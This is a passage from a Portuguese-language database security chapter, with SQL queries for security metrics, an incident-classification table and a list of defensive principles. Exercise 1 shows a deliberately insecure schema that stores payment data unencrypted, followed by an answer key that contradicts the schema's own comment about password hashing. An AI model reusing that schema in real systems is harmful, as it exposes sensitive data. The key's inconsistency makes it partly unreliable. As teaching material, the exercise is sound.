END;
$$ LANGUAGE plpgsql;
```

## Meticas de Seguranca para Databases

### KPIs Essenciais

```sql
-- Metricas de seguranca que toda organizacao deve monitorar

-- 1. Mean Time to Detect (MTTD)
SELECT 
    incident_type,
    AVG(EXTRACT(EPOCH FROM (detected_at - created_at)) / 3600) AS avg_detection_hours,
    MIN(EXTRACT(EPOCH FROM (detected_at - created_at)) / 3600) AS min_detection_hours,
    MAX(EXTRACT(EPOCH FROM (detected_at - created_at)) / 3600) AS max_detection_hours,
    COUNT(*) AS total_incidents
FROM security_incidents
WHERE created_at > NOW() - INTERVAL '90 days'
GROUP BY incident_type
ORDER BY avg_detection_hours DESC;

-- 2. Mean Time to Respond (MTTR)
SELECT 
    incident_type,
    AVG(EXTRACT(EPOCH FROM (resolved_at - detected_at)) / 3600) AS avg_response_hours,
    MIN(EXTRACT(EPOCH FROM (resolved_at - detected_at)) / 3600) AS min_response_hours,
    MAX(EXTRACT(EPOCH FROM (resolved_at - detected_at)) / 3600) AS max_response_hours
FROM security_incidents
WHERE detected_at > NOW() - INTERVAL '90 days'
AND resolved_at IS NOT NULL
GROUP BY incident_type;

-- 3. Patch Compliance Rate
SELECT 
    COUNT(CASE WHEN status = 'APPLIED' THEN 1 END)::DECIMAL / 
    NULLIF(COUNT(*), 0) * 100 AS patch_compliance_pct,
    COUNT(CASE WHEN status = 'APPLIED' THEN 1 END) AS applied,
    COUNT(CASE WHEN status != 'APPLIED' THEN 1 END) AS pending,
    COUNT(CASE WHEN deadline_for_application < NOW() AND status != 'APPLIED' THEN 1 END) AS overdue
FROM patch_management
WHERE patch_available_date > NOW() - INTERVAL '30 days';

-- 4. MFA Coverage
SELECT 
    COUNT(CASE WHEN mfa_enabled THEN 1 END)::DECIMAL / 
    NULLIF(COUNT(*), 0) * 100 AS mfa_coverage_pct,
    COUNT(CASE WHEN mfa_enabled THEN 1 END) AS with_mfa,
    COUNT(CASE WHEN NOT mfa_enabled THEN 1 END) AS without_mfa
FROM users
WHERE is_active = TRUE;

-- 5. Failed Login Analysis
SELECT 
    date_trunc('day', login_time) AS day,
    COUNT(CASE WHEN login_success THEN 1 END) AS successful_logins,
    COUNT(CASE WHEN NOT login_success THEN 1 END) AS failed_logins,
    COUNT(CASE WHEN NOT login_success THEN 1 END)::DECIMAL / 
    NULLIF(COUNT(*), 0) * 100 AS failure_rate_pct
FROM login_monitoring
WHERE login_time > NOW() - INTERVAL '30 days'
GROUP BY date_trunc('day', login_time)
ORDER BY day DESC;
```

## Exercicios Praticos

### Exercicio 1: Analise de Vulnerabilidade

```sql
-- Dado o esquema abaixo, identifique todas as vulnerabilidades de seguranca

CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),  -- Hash armazenado
    email VARCHAR(100),
    role VARCHAR(20),
    last_login TIMESTAMP
);

CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    user_id INT,
    total DECIMAL(10,2),
    status VARCHAR(20),
    payment_info TEXT  -- Dados de pagamento em texto
);

-- Perguntas:
-- 1. Quais vulnerabilidades existem neste esquema?
-- 2. Como voce implementaria seguranca de coluna?
-- 3. Quais indices seriam necessarios para performance E seguranca?
-- 4. Como voce implementaria audit trail?
-- 5. Como voce implementaria row-level security?

-- Respostas:
-- 1. Vulnerabilidades:
--    - password em texto (deveria ser hash com bcrypt)
--    - role sem validacao (deveria ser CHECK constraint)
--    - payment_info em texto (deveria ser criptografado)
--    - last_login sem timezone
--    - Falta de created_at/updated_at
--    - Falta de soft delete para compliance
--    - Falta de audit trail

-- 2. Seguranca de coluna:
--    - Usar pgcrypto para criptografar payment_info
--    - Usar views com mascaramento para dados sensiveis
--    - Implementar column-level permissions

-- 3. Indices:
--    - UNIQUE index em username (evitar duplicatas)
--    - UNIQUE index em email
--    - INDEX em role (para queries de autorizacao)
--    - INDEX em user_id em orders (para joins)

-- 4. Audit trail:
--    - Criar tabela de audit separada
--    - Usar triggers para registrar todas as mudancas
--    - Implementar pgaudit para logging automatico

-- 5. Row-level security:
--    - Habilitar RLS em orders
--    - Criar policy que filtra por user_id = current_user_id
--    - Configurar para que admins vejam tudo
```

### Exercicio 2: Plano de Resposta a Incidentes

```sql
-- Desenvolva um plano de resposta a incidentes para database
-- Considere: SQL injection, credential compromise, data exfiltration

-- Passo 1: Classificacao de incidentes
CREATE TABLE incident_classification (
    severity VARCHAR(10),
    response_time_sla VARCHAR(50),
    escalation_path TEXT,
    communication_plan TEXT,
    recovery_actions TEXT
);

INSERT INTO incident_classification VALUES
('CRITICAL', '1 hour',
 'DBA -> CISO -> CEO -> Legal -> Board',
 'Immediate notification to all stakeholders, regulatory bodies within 72h',
 'Isolate affected systems, preserve forensics, restore from backup'),
('HIGH', '4 hours',
 'DBA -> CISO -> IT Director',
 'Notify IT security team, legal if data exposed',
 'Block attack vector, review access logs, rotate credentials'),
('MEDIUM', '24 hours',
 'DBA -> IT Manager',
 'Notify IT team, document incident',
 'Apply patches, review configurations'),
('LOW', '72 hours',
 'DBA -> Team Lead',
 'Document and track',
 'Address in next maintenance window');

-- Passo 2: Runbooks para cada tipo de incidente
-- (ja coberto na secao Pattern 4 acima)
```

## Referencia Final: Principios de Seguranca de Databases

```sql
-- 10 principios inegociaveis para seguranca de databases

/*
1. PRINCIPIO DO MENOR PRIVILEGIO
   Cada usuario, aplicacao e servico deve ter apenas as permissoes
   estritamente necessarias para sua funcao.

2. DEFESA EM CAMADAS
   Nunca depender de uma unica camada de seguranca.
   Rede, autenticacao, autorizacao, criptografia, monitoramento.

3. SEGURANCA POR PADRAO
   Configuracoes seguras devem ser o padrao, nao a excecao.
   Novos databases devem nascer seguros.

4. SEGURANCA NA PROJECAO
   Seguranca deve ser considerada desde a fase de design,
   nao adicionada depois como remendo.

5. MONITORAMENTO CONTINUO
   Log, audite e monitore todos os acessos a dados sensiveis.
   Detecte anomalias em tempo real.

6. CRIPTOGRAFIA DE DADOS SENSIVEIS
   Criptografe dados em repouso e em transito.
   Gerencie chaves de criptografia com HSMs.

7. GESTAO DE CREDENCIAIS
   Nunca armazene credenciais em codigo-fonte ou scripts.
   Use vaults de seguranca e rotacione regularmente.

8. GESTAO DE PATCHES
   Aplique patches de seguranca rapidamente.
   CVSS >= 9.0 deve ser aplicado em 24 horas.

9. PREPARACAO PARA INCIDENTES
   Tenha um plano de resposta a incidentes testado.
   Faca tabletop exercises regularmente.

10. MELHORIA CONTINUA
    Analise incidentes, aprenda com ataques reais.
    Atualize defesas conforme ameacas evoluem.
*/
```

Esses dez principios, aplicados consistentemente, formam a base de uma estrategia robusta de seguranca de databases. Cada um deles foi violado em pelo menos um dos casos estudados neste capitulo, e cada violacao resultou em danos significativos. A questao nao e se sua organizacao sera atacada, mas quando — e se suas defesas estao preparadas para o momento em que isso acontecer.

A seguranca de databases nao e uma funcao isolada do time de TI. E uma responsabilidade compartilhada entre desenvolvedores, DBAs, administradores de rede, equipe de seguranca e lideranca executiva. Cada profissional que interage com dados sensiveis tem um papel na protecao desses dados. Desde o desenvolvedor que escreve queries parametrizadas ate o CISO que define a estrategia de seguranca, todos contribuem para a postura de seguranca da organizacao.

Os ataques estudados neste capitulo mostram que adversaries sao persistentes, criativos e bem financiados. Grupos como APT29, Cl0p e DarkSide operam com recursos de paises, enquanto hackers independentes como Paige Thompson demonstram que uma pessoa determinada pode causar danos massivos. A defesa contra essas ameacas requer dedicao constante, investimento continuo e cultura de seguranca em toda a organizacao.
